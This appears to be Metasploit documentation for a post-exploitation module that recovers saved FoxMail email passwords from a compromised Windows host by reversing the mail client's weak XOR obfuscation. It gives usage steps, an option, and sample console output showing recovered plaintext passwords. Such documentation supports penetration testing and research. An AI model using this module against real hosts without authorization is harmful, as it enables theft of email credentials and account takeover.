## Vulnerable Application
All FoxMail installations up to including 7.2.19 (the latest version at the time of writing)
are vulnerable as they all rely on a variant of the XOR algorithum to obfuscate the password.

## Verification Steps

  1. Download and install Foxmail package from the official website: https://foxmail.com/win/en.
  2. Use FoxMail to log into a mail server.
  3. Remember to save the account password.
  4. Get a `meterpreter` session on a Windows host.
  5. Do: `run post/windows/gather/credentials/foxmail`
  6. If the account file is saved in the system, the email, server, port and plaintext password will be printed.

## Options

### ACCOUNT_PATH

Specifies the account directory path for Foxmail

## Scenarios
### FoxMail 7.2 on Windows 10 v1903
```
[*] Search account files on C:\Foxmail 7.2\Storage
[+] Parsing configuration file: 'C:\Foxmail 7.2\Storage\kali-team@qq.com\Accounts\Account.rec0', please wait.
Foxmail Password
================

Email                       Server                   Port  SSL    Password
-----                       ------                   ----  ---    --------
kali-team@qq.com            imap.qq.com              993   true   fjcqkkeqbuweddch
kali-team@qq.com            smtp.qq.com              465   true   fjcqkkeqbuweddch

[+] Passwords stored in: /home/kali-team/.msf4/loot/20201004174103_default_10.0.2.15_host.foxmail_pas_205001.txt
[*] Post module execution completed

```

### FoxMail 7.2 on Windows 10 v1903, with ACCOUNT_PATH specified

```
msf6 post(windows/gather/credentials/foxmail) > set account_path "C:\Foxmail 7.2\Storage\"
account_path => C:\Foxmail 7.2\Storage\
msf6 post(windows/gather/credentials/foxmail) > run
[*] Search account files on C:\Foxmail 7.2\Storage\kali-team@qq.com\Accounts
[+] Parsing configuration file: 'C:\Foxmail 7.2\Storage\kali-team@qq.com\Accounts\Account.rec0', please wait.
Foxmail Password
================

Email              Server       Port  SSL   Password
-----              ------       ----  ---   --------
kali-team@qq.com   imap.qq.com  993   true  fjcqkkeqbuweddch
kali-team@qq.com   smtp.qq.com  465   true  fjcqkkeqbuweddch

[+] Passwords stored in: /home/kali-team/.msf4/loot/20201004174452_default_10.0.2.15_host.foxmail_pas_487470.txt
[*] Post module execution completed
```
